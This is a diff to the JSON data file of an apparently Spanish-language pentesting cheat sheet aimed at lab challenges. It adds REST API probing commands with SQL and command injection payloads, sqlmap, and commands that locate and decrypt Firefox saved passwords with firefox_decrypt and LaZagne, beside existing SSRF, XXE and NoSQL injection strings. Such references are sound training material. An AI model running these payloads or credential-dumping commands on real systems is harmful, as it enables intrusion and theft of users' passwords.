@@ -1,8 +1,8 @@
 {
-  "generatedAt": "2026-07-07",
+  "generatedAt": "2026-07-08",
   "stats": {
     "totalSections": 19,
-    "totalCommands": 381,
+    "totalCommands": 397,
     "totalTags": 9
   },
   "tags": [
@@ -896,6 +896,17 @@
         "ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -recursion -recursion-depth 2 -fc 404",
         "katana -u $URL -d 3",
         "arjun -u \"$URL/page.php\"",
+        "curl -sS $URL/api/ ; curl -sS $URL/api/v1/",
+        "curl -sS $URL/swagger.json ; curl -sS $URL/openapi.json ; curl -sS $URL/api-docs",
+        "curl -sS -i -X OPTIONS \"$URL/api/resource\"",
+        "for m in GET POST PUT DELETE PATCH OPTIONS HEAD; do echo -n \"$m \"; curl -s -o /dev/null -w \"%{http_code}\\n\" -X $m \"$URL/api/resource\"; done",
+        "curl -sS -i -X PUT \"$URL/api/resource\" -H 'Content-Type: application/json' -d '{}'",
+        "curl -sS -i -X POST \"$URL/api/resource\" -H 'X-HTTP-Method-Override: PUT'",
+        "curl -sS -X POST \"$URL/api/login\" -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"test\"}'",
+        "curl -sS -X POST \"$URL/api/search\" -H 'Content-Type: application/json' -d '{\"q\":\"1 OR 1=1-- -\"}'",
+        "curl -sS -X POST \"$URL/api/ping\" -H 'Content-Type: application/json' -d '{\"host\":\"127.0.0.1; id\"}'",
+        "curl -sS \"$URL/api/me\" -H \"Authorization: Bearer $TOKEN\"",
+        "sqlmap -r request.txt --batch --level 3",
         "arjun -u \"$URL/api/endpoint\"",
         "ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -fc 404",
         "ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/common.txt -fc 404",
@@ -1010,7 +1021,28 @@
             "Si todo devuelve 200, mide una ruta random y filtra por -fs/-fw/-fl en ffuf o --hh/--hw/--hl en wfuzz.",
             "Separa fuzzing de rutas, archivos, vhosts y parametros; mezclarlo todo genera ruido y pierdes hallazgos.",
             "En APIs prueba primero endpoints conocidos por JS/katana y despues fuzzing sobre /api, /v1, /graphql o rutas versionadas.",
-            "En THM empieza con wordlists pequenas y sube a raft/medium cuando tengas senales reales."
+            "En THM empieza con wordlists pequenas y sube a raft/medium cuando tengas senales reales.",
+            "Fuzzea el metodo HTTP (GET/POST/PUT/DELETE/PATCH): un endpoint puede aceptar datos o ser inyectable solo por un verbo concreto."
+          ]
+        ],
+        [
+          "h2",
+          "APIs REST y metodos HTTP"
+        ],
+        [
+          "code",
+          [
+            "curl -sS $URL/api/ ; curl -sS $URL/api/v1/",
+            "curl -sS $URL/swagger.json ; curl -sS $URL/openapi.json ; curl -sS $URL/api-docs",
+            "curl -sS -i -X OPTIONS \"$URL/api/resource\"",
+            "for m in GET POST PUT DELETE PATCH OPTIONS HEAD; do echo -n \"$m \"; curl -s -o /dev/null -w \"%{http_code}\\n\" -X $m \"$URL/api/resource\"; done",
+            "curl -sS -i -X PUT \"$URL/api/resource\" -H 'Content-Type: application/json' -d '{}'",
+            "curl -sS -i -X POST \"$URL/api/resource\" -H 'X-HTTP-Method-Override: PUT'",
+            "curl -sS -X POST \"$URL/api/login\" -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"test\"}'",
+            "curl -sS -X POST \"$URL/api/search\" -H 'Content-Type: application/json' -d '{\"q\":\"1 OR 1=1-- -\"}'",
+            "curl -sS -X POST \"$URL/api/ping\" -H 'Content-Type: application/json' -d '{\"host\":\"127.0.0.1; id\"}'",
+            "curl -sS \"$URL/api/me\" -H \"Authorization: Bearer $TOKEN\"",
+            "sqlmap -r request.txt --batch --level 3"
           ]
         ],
         [
@@ -1067,7 +1099,7 @@
           ]
         ]
       ],
-      "searchText": "Web y APIs De discovery web a bugs de autorizacion, SSRF, JWT y uploads. Fingerprinting y discovery curl -i $URL/ whatweb -a 3 $URL ffuf -u \"$URL/FUZZ\" -w /usr/share/wordlists/dirb/common.txt -e .php,.txt,.html -fc 404 ffuf -u \"$URL/\" -H \"Host: FUZZ.target.local\" -w subdomains.txt -fs 0 gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -b 404 gobuster vhost -u $URL -w subdomains.txt --append-domain feroxbuster -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 $URL/FUZZ wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 404 $URL/FUZZ wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -z list,php-txt-html --hc 404 $URL/FUZZ.FUZ2Z ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -e .php,.txt,.bak,.old,.zip -fc 404 ffuf -u \"$URL/api/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -fc 404 ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -X POST -d 'FUZZ=test' -H 'Content-Type: application/x-www-form-urlencoded' -fs 0 wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -d 'FUZZ=test' --hh 0 $URL/page.php ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -recursion -recursion-depth 2 -fc 404 katana -u $URL -d 3 arjun -u \"$URL/page.php\" Si todo devuelve 200, mide una ruta random y filtra por -fs/-fw/-fl en ffuf o --hh/--hw/--hl en wfuzz. Separa fuzzing de rutas, archivos, vhosts y parametros; mezclarlo todo genera ruido y pierdes hallazgos. En APIs prueba primero endpoints conocidos por JS/katana y despues fuzzing sobre /api, /v1, /graphql o rutas versionadas. En THM empieza con wordlists pequenas y sube a raft/medium cuando tengas senales reales. Triage de bugs Bug Senales y prueba inicial LFI Parametros file/page/lang/template. Probar ../../../../etc/passwd y php://filter. SSTI Payloads {{7*7}}, ${7*7}, <%= 7*7 %>; confirmar motor antes de explotar. IDOR/BOLA Cambiar IDs entre usuarios. Si ves datos ajenos, hay autorizacion rota. JWT Revisar alg, kid, role, user_id, exp. Probar solo si el reto apunta a firma debil. GraphQL Introspection, tipos, queries/mutations con id/userId/admin/debug. SSRF Parametros url/webhook/avatar/import. Confirmar contra tu listener antes de localhost. XXE Entradas XML/SVG/SOAP/SAML/DOCX; probar entidad file:///etc/passwd en lab. Upload Extension, Content-Type, magic bytes, doble extension, ruta de ejecucion. Command injection host/ip/domain/filename. Confirmar con id/whoami/hostname o delay controlado. arjun -u \"$URL/api/endpoint\" ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -fc 404 ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/common.txt -fc 404 ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -fc 404,403 ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -e .php,.txt,.html,.bak,.old,.zip -fc 404 ffuf -u \"$URL/FUZZ/\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -recursion -recursion-depth 2 -fc 404 ffuf -u \"$URL/\" -H \"Host: FUZZ.$DOMAIN\" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0 wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 404,403 $URL/FUZZ/ wfuzz -c -H \"Host: FUZZ.$DOMAIN\" -z file,/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 0 $URL/ feroxbuster -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak,old,zip -k gobuster dir -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak,old,zip -b 404 gobuster vhost -u $URL -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain GET /api/users/1001 GET /api/users/1002 GET /api/orders/5 GET /api/orders/6 jwt_tool TOKEN python3 - <<'PY'\nimport jwt\nprint(jwt.get_unverified_header('TOKEN'))\nprint(jwt.decode('TOKEN', options={'verify_signature': False}))\nPY POST /graphql {\"query\":\"{__schema{types{name}}}\"} {\"query\":\"{users{id username email role}}\"} url=http://127.0.0.1:80 url=http://localhost:8000 url=http://169.254.169.254/latest/meta-data/ url=http://[::1]/ url=file:///etc/passwd <?xml version=\"1.0\"?> <!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]> <root>&xxe;</root> {\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}} username[$ne]=admin&password[$ne]=x {\"$where\":\"this.username=='admin'\"} ; id && id | id `id` $(id) %0Aid"
+      "searchText": "Web y APIs De discovery web a bugs de autorizacion, SSRF, JWT y uploads. Fingerprinting y discovery curl -i $URL/ whatweb -a 3 $URL ffuf -u \"$URL/FUZZ\" -w /usr/share/wordlists/dirb/common.txt -e .php,.txt,.html -fc 404 ffuf -u \"$URL/\" -H \"Host: FUZZ.target.local\" -w subdomains.txt -fs 0 gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -b 404 gobuster vhost -u $URL -w subdomains.txt --append-domain feroxbuster -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 $URL/FUZZ wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 404 $URL/FUZZ wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -z list,php-txt-html --hc 404 $URL/FUZZ.FUZ2Z ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -e .php,.txt,.bak,.old,.zip -fc 404 ffuf -u \"$URL/api/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -fc 404 ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -X POST -d 'FUZZ=test' -H 'Content-Type: application/x-www-form-urlencoded' -fs 0 wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -d 'FUZZ=test' --hh 0 $URL/page.php ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -recursion -recursion-depth 2 -fc 404 katana -u $URL -d 3 arjun -u \"$URL/page.php\" Si todo devuelve 200, mide una ruta random y filtra por -fs/-fw/-fl en ffuf o --hh/--hw/--hl en wfuzz. Separa fuzzing de rutas, archivos, vhosts y parametros; mezclarlo todo genera ruido y pierdes hallazgos. En APIs prueba primero endpoints conocidos por JS/katana y despues fuzzing sobre /api, /v1, /graphql o rutas versionadas. En THM empieza con wordlists pequenas y sube a raft/medium cuando tengas senales reales. Fuzzea el metodo HTTP (GET/POST/PUT/DELETE/PATCH): un endpoint puede aceptar datos o ser inyectable solo por un verbo concreto. APIs REST y metodos HTTP curl -sS $URL/api/ ; curl -sS $URL/api/v1/ curl -sS $URL/swagger.json ; curl -sS $URL/openapi.json ; curl -sS $URL/api-docs curl -sS -i -X OPTIONS \"$URL/api/resource\" for m in GET POST PUT DELETE PATCH OPTIONS HEAD; do echo -n \"$m \"; curl -s -o /dev/null -w \"%{http_code}\\n\" -X $m \"$URL/api/resource\"; done curl -sS -i -X PUT \"$URL/api/resource\" -H 'Content-Type: application/json' -d '{}' curl -sS -i -X POST \"$URL/api/resource\" -H 'X-HTTP-Method-Override: PUT' curl -sS -X POST \"$URL/api/login\" -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"test\"}' curl -sS -X POST \"$URL/api/search\" -H 'Content-Type: application/json' -d '{\"q\":\"1 OR 1=1-- -\"}' curl -sS -X POST \"$URL/api/ping\" -H 'Content-Type: application/json' -d '{\"host\":\"127.0.0.1; id\"}' curl -sS \"$URL/api/me\" -H \"Authorization: Bearer $TOKEN\" sqlmap -r request.txt --batch --level 3 Triage de bugs Bug Senales y prueba inicial LFI Parametros file/page/lang/template. Probar ../../../../etc/passwd y php://filter. SSTI Payloads {{7*7}}, ${7*7}, <%= 7*7 %>; confirmar motor antes de explotar. IDOR/BOLA Cambiar IDs entre usuarios. Si ves datos ajenos, hay autorizacion rota. JWT Revisar alg, kid, role, user_id, exp. Probar solo si el reto apunta a firma debil. GraphQL Introspection, tipos, queries/mutations con id/userId/admin/debug. SSRF Parametros url/webhook/avatar/import. Confirmar contra tu listener antes de localhost. XXE Entradas XML/SVG/SOAP/SAML/DOCX; probar entidad file:///etc/passwd en lab. Upload Extension, Content-Type, magic bytes, doble extension, ruta de ejecucion. Command injection host/ip/domain/filename. Confirmar con id/whoami/hostname o delay controlado. arjun -u \"$URL/api/endpoint\" ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -fc 404 ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/common.txt -fc 404 ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -fc 404,403 ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -e .php,.txt,.html,.bak,.old,.zip -fc 404 ffuf -u \"$URL/FUZZ/\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -recursion -recursion-depth 2 -fc 404 ffuf -u \"$URL/\" -H \"Host: FUZZ.$DOMAIN\" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0 wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 404,403 $URL/FUZZ/ wfuzz -c -H \"Host: FUZZ.$DOMAIN\" -z file,/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 0 $URL/ feroxbuster -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak,old,zip -k gobuster dir -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak,old,zip -b 404 gobuster vhost -u $URL -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain GET /api/users/1001 GET /api/users/1002 GET /api/orders/5 GET /api/orders/6 jwt_tool TOKEN python3 - <<'PY'\nimport jwt\nprint(jwt.get_unverified_header('TOKEN'))\nprint(jwt.decode('TOKEN', options={'verify_signature': False}))\nPY POST /graphql {\"query\":\"{__schema{types{name}}}\"} {\"query\":\"{users{id username email role}}\"} url=http://127.0.0.1:80 url=http://localhost:8000 url=http://169.254.169.254/latest/meta-data/ url=http://[::1]/ url=file:///etc/passwd <?xml version=\"1.0\"?> <!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]> <root>&xxe;</root> {\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}} username[$ne]=admin&password[$ne]=x {\"$where\":\"this.username=='admin'\"} ; id && id | id `id` $(id) %0Aid"
     },
     {
       "id": "section-07",
@@ -1287,6 +1319,11 @@
         "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
         "john --show hash.txt",
         "hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt",
+        "find / \\( -name logins.json -o -name key4.db -o -name signons.sqlite \\) 2>/dev/null",
+        "python3 firefox_decrypt.py ~/.mozilla/firefox/*.default-release/",
+        "python3 firefox_decrypt.py /ruta/al/perfil",
+        "lazagne.exe all",
+        "python3 lazagne.py browsers",
         "find / -name '*pass*' -o -name '*cred*' -o -name '*.kdbx' 2>/dev/null",
         "grep -RniE 'pass|password|passwd|pwd|secret|token|api[_-]?key' /var/www /opt /home 2>/dev/null",
         "find /home -name '.ssh' -type d 2>/dev/null",
@@ -1392,15 +1429,30 @@
           ]
         ],
         [
+          "h2",
+          "Loot de navegadores y apps"
+        ],
+        [
+          "code",
+          [
+            "find / \\( -name logins.json -o -name key4.db -o -name signons.sqlite \\) 2>/dev/null",
+            "python3 firefox_decrypt.py ~/.mozilla/firefox/*.default-release/",
+            "python3 firefox_decrypt.py /ruta/al/perfil",
+            "lazagne.exe all",
+            "python3 lazagne.py browsers"
+          ]
+        ],
+        [
           "bullets",
           [
+            "Firefox guarda logins en logins.json + key4.db; con firefox_decrypt sacas las passwords en claro.",
             "Etiqueta cada credencial por fuente y servicio probado.",
             "Despues de cada credencial valida, reenumera: shares, sudo, WinRM, DB, panel web, LDAP.",
             "En AD evita spraying agresivo; usa usuarios reales y una password candidata con control."
           ]
         ]
       ],
-      "searchText": "Credenciales y loot Buscar, convertir, crackear y reutilizar sin caos. Fuente Que mirar Web root .env, config.php, wp-config.php, web.config, appsettings.json. Homes .ssh, history, Desktop, Downloads, backups, notas. Shares Backups, IT, Dev, Deploy, SYSVOL, NETLOGON, scripts. Windows cmdkey, Unattend.xml, PowerShell history, IIS configs. Linux /var/www, /opt, /var/backups, cron scripts, bash history. Conversiones frecuentes ssh2john id_rsa > id_rsa.hash keepass2john vault.kdbx > keepass.hash zip2john secret.zip > zip.hash office2john doc.docx > office.hash john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt john --show hash.txt hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt Etiqueta cada credencial por fuente y servicio probado. Despues de cada credencial valida, reenumera: shares, sudo, WinRM, DB, panel web, LDAP. En AD evita spraying agresivo; usa usuarios reales y una password candidata con control. find / -name '*pass*' -o -name '*cred*' -o -name '*.kdbx' 2>/dev/null grep -RniE 'pass|password|passwd|pwd|secret|token|api[_-]?key' /var/www /opt /home 2>/dev/null find /home -name '.ssh' -type d 2>/dev/null cat ~/.bash_history 2>/dev/null ls -la /var/backups /backup /opt 2>/dev/null cmdkey /list dir /s /b *pass* *cred* *config* *backup* *.kdbx 2>nul findstr /si password *.txt *.ini *.config *.xml *.json 2>nul type %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 2>nul type C:\\Windows\\Panther\\Unattend.xml 2>nul rar2john secret.rar > rar.hash office2john document.docx > office.hash pdf2john file.pdf > pdf.hash hashid hash.txt hashcat --example-hashes | grep -i ntlm -n hashcat -m 3200 bcrypt.hash /usr/share/wordlists/rockyou.txt hashcat --show -m 1000 ntlm.hash ssh user@$IP smbclient -L //$IP -U 'user%password' nxc smb $IP -u user -p password nxc winrm $IP -u user -p password mysql -h $IP -u user -p sudo -l keepass2john database.kdbx > keepass.hash john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash john --show keepass.hash kpcli --kdb database.kdbx"
+      "searchText": "Credenciales y loot Buscar, convertir, crackear y reutilizar sin caos. Fuente Que mirar Web root .env, config.php, wp-config.php, web.config, appsettings.json. Homes .ssh, history, Desktop, Downloads, backups, notas. Shares Backups, IT, Dev, Deploy, SYSVOL, NETLOGON, scripts. Windows cmdkey, Unattend.xml, PowerShell history, IIS configs. Linux /var/www, /opt, /var/backups, cron scripts, bash history. Conversiones frecuentes ssh2john id_rsa > id_rsa.hash keepass2john vault.kdbx > keepass.hash zip2john secret.zip > zip.hash office2john doc.docx > office.hash john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt john --show hash.txt hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt Loot de navegadores y apps find / \\( -name logins.json -o -name key4.db -o -name signons.sqlite \\) 2>/dev/null python3 firefox_decrypt.py ~/.mozilla/firefox/*.default-release/ python3 firefox_decrypt.py /ruta/al/perfil lazagne.exe all python3 lazagne.py browsers Firefox guarda logins en logins.json + key4.db; con firefox_decrypt sacas las passwords en claro. Etiqueta cada credencial por fuente y servicio probado. Despues de cada credencial valida, reenumera: shares, sudo, WinRM, DB, panel web, LDAP. En AD evita spraying agresivo; usa usuarios reales y una password candidata con control. find / -name '*pass*' -o -name '*cred*' -o -name '*.kdbx' 2>/dev/null grep -RniE 'pass|password|passwd|pwd|secret|token|api[_-]?key' /var/www /opt /home 2>/dev/null find /home -name '.ssh' -type d 2>/dev/null cat ~/.bash_history 2>/dev/null ls -la /var/backups /backup /opt 2>/dev/null cmdkey /list dir /s /b *pass* *cred* *config* *backup* *.kdbx 2>nul findstr /si password *.txt *.ini *.config *.xml *.json 2>nul type %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 2>nul type C:\\Windows\\Panther\\Unattend.xml 2>nul rar2john secret.rar > rar.hash office2john document.docx > office.hash pdf2john file.pdf > pdf.hash hashid hash.txt hashcat --example-hashes | grep -i ntlm -n hashcat -m 3200 bcrypt.hash /usr/share/wordlists/rockyou.txt hashcat --show -m 1000 ntlm.hash ssh user@$IP smbclient -L //$IP -U 'user%password' nxc smb $IP -u user -p password nxc winrm $IP -u user -p password mysql -h $IP -u user -p sudo -l keepass2john database.kdbx > keepass.hash john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash john --show keepass.hash kpcli --kdb database.kdbx"
     },
     {
       "id": "section-10",
